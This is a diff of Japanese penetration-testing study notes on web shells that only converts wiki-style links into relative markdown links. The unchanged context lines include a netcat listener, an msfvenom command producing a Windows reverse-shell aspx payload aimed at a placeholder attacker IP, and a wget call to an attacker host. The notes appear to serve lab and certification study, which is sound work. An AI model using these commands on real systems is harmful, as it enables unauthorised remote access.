@@ -1,5 +1,5 @@
 - 関連ノート：
-	- [[What is the shell]]
+	- [What is the shell](What%20is%20the%20shell.md)
 
 ---
 
@@ -53,7 +53,7 @@ $$WebShell実行例$$
 - エンコード方法はターゲット環境に応じて異なる
 - 基本はBurp SuiteのHackVertorを使って、"url_encode_not_plus"する
 
-🪟Windows：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]
+🪟Windows：[What is the shell](What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)
 
 トラブルシューティング: Reverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
 ```zsh
@@ -84,7 +84,7 @@ sudo nc -lvnp 4444
 	-→ これらは、デフォルトでは<u>Windowsで動作しない</u>ため、[Reverse Shell Generator](https://www.revshells.com/)でシェルをcmdやpowershellでペイロードを生成する
 
 - Webアプリケーションにペイロードをアップロードできても、phpでは、`shell_exec`の無効化などにより、`?cmd=id`などが実行できないことがある
-	- →[[#トラブルシューティング]]
+	- →[WebShell](WebShell.md#トラブルシューティング)
 
 ## 💡Tip
 
@@ -99,7 +99,7 @@ sudo nc -lvnp 4444
 # Webアプリのソースコードを取得する考え方と手法概要
 
 - 関連ノート：
-	- [[Summary - Apex]]
+	- [Summary - Apex](../../Lab_Writeup/Proving_Grounds/Summary%20-%20Apex.md)
 
 ## 目的
 
@@ -339,7 +339,7 @@ http://example/config.php
 
 ### SSH鍵書き込みによるエクスプロイト
 
-- 関連ノート：[[22 - SSH#公開鍵一覧の書き換え]]
+- 関連ノート：[22 - SSH](../Ports%20-%20Service/22%20-%20SSH.md#公開鍵一覧の書き換え)
 - ⚠️webサーバを動作させているユーザにはその権限があることは少ない
 
 ```php
@@ -429,7 +429,7 @@ http://target/shell.aspx
 
 #### Reverse shell 
 
-- 関連ノート：[[☠️Msfvenom]]
+- 関連ノート：[☠️Msfvenom](../../Tools/☠️Msfvenom.md)
 
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<Port> -f aspx -o reverse.aspx
@@ -477,7 +477,7 @@ Current Dir: <%= Directory.GetCurrentDirectory() %><br>
 	- aspx
 	- ashx
 	- asmx
-- 拡張子は、[[⚡️File upload vuln#サーバ設定の上書きによるバイパス]]で変更できる可能性がある
+- 拡張子は、[⚡️File upload vuln](../../../BSCP/Server-side/File%20upload%20vuln/⚡️File%20upload%20vuln.md#サーバ設定の上書きによるバイパス)で変更できる可能性がある
 
 #### 認証バイパス
 
@@ -566,5 +566,5 @@ wget <attacker_ip>/test.txt
 	- `popen`
 	- `proc_open`
 
-- 実行できないときは、攻撃ベクターを[[#File読み取り]]に切り替える
+- 実行できないときは、攻撃ベクターを[WebShell](WebShell.md#File読み取り)に切り替える
 
